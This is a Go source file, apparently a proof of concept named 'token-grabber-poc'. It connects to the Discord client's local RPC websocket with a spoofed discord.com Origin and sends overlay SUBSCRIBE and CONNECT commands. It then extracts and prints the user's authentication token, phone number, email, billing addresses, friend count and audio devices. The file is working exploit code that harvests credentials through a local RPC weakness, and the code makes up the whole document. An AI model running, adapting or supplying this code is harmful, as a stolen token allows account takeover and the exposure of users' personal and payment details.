package main

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/gorilla/websocket"
)

var (
	socketURL = "ws://127.0.0.1:6463/?v=1&encoding=json"
	headers   = http.Header{}
)

func initPayload(c *websocket.Conn) {

	var ready sendReady
	ready.Cmd = "SUBSCRIBE"
	ready.Evt = "OVERLAY"
	ready.Nonce = "test"
	var con = &connect{
		Cmd: "OVERLAY",
		Args: &connectArgs{
			Type: "CONNECT",
			Pid:  4,
		},
		Nonce: "test",
	}
	c.WriteJSON(ready)
	c.WriteJSON(con)
}

func logToken(payload *payloads) {
	user := payload.User
	fmt.Printf("Welcome %s#%s! It seems your token has been logged...\nToken: %s\nPhone: %s\nEmail: %s\n", user.Username, user.Discriminator, payload.Token, user.PhoneNumber, user.Email)
	fmt.Printf("Wait but that isn't all!\n\nBilling Information:\n")
	for _, addy := range payload.PaymentInfo {
		fmt.Printf("	Address1: %s\n	Address2: %s\n	Email: %s\n	Name: %s\n	City: %s\n	PostalCode: %s\n	State: %s\n	Country: %s\n\n", addy.Address.FirstAddress, addy.Address.SecondAddress, addy.Email, addy.Address.Name, addy.Address.City, addy.Address.PostalCode, addy.Address.State, addy.Address.Country)
	}
	friends := 0
	for _, f := range payload.Friends {
		if f == 1 {
			friends++
		}
	}
	fmt.Printf("I could get even more information as well. Did you know that you have %v friends?\n\n", friends)

	fmt.Printf("I can even get your input and output devices!\n")
	fmt.Printf("\nInput:\n")
	for _, d := range payload.MediaState.Input {
		fmt.Printf("	%s\n", d.Name)
	}
	fmt.Printf("\nOutput:\n")
	for _, d := range payload.MediaState.Output {
		fmt.Printf("	%s\n", d.Name)
	}
	fmt.Println("\nAnyways follow me on github and checkout this repo!\nhttps://github.com/post04\nhttps://github.com/post04/token-grabber-poc")
}

func main() {
	headers["Origin"] = []string{"https://discord.com"}
	c, _, err := websocket.DefaultDialer.Dial(socketURL, headers)
	if err != nil {
		c.Close()
		return
	}

	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			c.Close()
			return
		}
		payload := &base{}
		err = json.Unmarshal(message, &payload)
		if err != nil {
			fmt.Println(err)
			return
		}
		switch payload.Event {
		case "READY":
			fmt.Println("Ready triggered!")
			initPayload(c)
		default:
			if payload.Cmd == "DISPATCH" && payload.Data.Type == "DISPATCH" && payload.Data.PID == 4 {
				logToken(payload.Data.Payloads[0])
			}
		}
	}
}
